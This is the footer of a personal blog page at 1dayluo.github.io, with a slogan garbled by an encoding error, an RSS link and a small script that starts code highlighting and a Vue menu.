  <div class="slogan">ç¢æœˆæ˜Ÿè¾°æ½æ±Ÿé£ , æˆ‘å¿ƒæœ‰å‰‘é—®å¤©æ¶¯ </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
   | <a class="rss" href="https://1dayluo.github.io/atom.xml" target="_blank">RSS</a>
</div>


    </div>
    <script type="application/javascript">

hljs.initHighlightingOnLoad()

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>




  </body>
</html>
